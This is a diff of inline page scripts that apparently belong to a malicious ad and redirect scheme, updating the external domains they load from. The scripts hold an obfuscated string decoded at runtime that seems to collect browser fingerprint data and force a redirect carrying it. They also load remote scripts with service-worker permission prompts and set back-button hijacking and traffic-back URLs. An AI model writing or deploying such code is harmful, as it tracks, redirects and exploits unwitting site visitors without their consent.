@@ -1,14 +1,14 @@
 <script>
   var url = new URL(window.location.href);
-  var pci = url.host.replace(/^try\d+\./, '');
+  var pci = url.host.replace(/try\d+\./, '');
   var ppi = pci;
-  var trafficbackURL = "https://n91hg.com/4/5478606/?var="+ppi+"&ymid="+pci;
+  var trafficbackURL = "https://g0st.com/4/5478606/?var="+ppi+"&ymid="+pci;
 </script>
 
 <script>
   var a='mcrpolfattafloprcmlVeedrosmico?ncc=uca&FcusleluVlearVsyipoonrctannEdhrgoiiHdt_emgocdeellicboosmccoast_avDetrnseigoAnrcebsruocw=seelri_bvoemr_ssiiocn'.split('').reduce((m,c,i)=>i%2?m+c:c+m).split('c');var Replace=(o=>{var v=a[0];try{v+=a[1]+Boolean(navigator[a[2]][a[3]]);navigator[a[2]][a[4]](o[0]).then(r=>{o[0].forEach(k=>{v+=r[k]?a[5]+o[1][o[0].indexOf(k)]+a[6]+encodeURIComponent(r[k]):a[0]})})}catch(e){}return u=>window.location.replace([u,v].join(u.indexOf(a[7])>-1?a[5]:a[7]))})([[a[8],a[9],a[10],a[11]],[a[12],a[13],a[14],a[15]]]);
   var s = document.createElement('script');
-  s.src='//vuzismoothie.net/225/2af90/mw.min.js?z=9569878'+'&ymid='+pci+'&var='+ppi+'&sw=/sw-check-permissions-73b04.js'+'&nouns=1';
+  s.src='//10zon.com/225/2af90/mw.min.js?z=9569878'+'&ymid='+pci+'&var='+ppi+'&sw=/sw-check-permissions-73b04.js'+'&nouns=1';
   s.onload = function(result) {
       switch (result) {
           case 'onPermissionDefault':
@@ -27,10 +27,10 @@
 </script>
 
 <script>
-  var Back_Button_Zone = 9037683;
+  var Back_Button_Zone = 5478606;
   var Domain_TB = "rel-s.com";
 </script>
-<script async src="https://desenteir.com/225/2af90/reverse.min.js?sf=1"></script>  
+<script async src="https://desenteir.com/225/2af90/reverse.min.js?sf=1"></script>
 
 <script>
   function isInApp() {
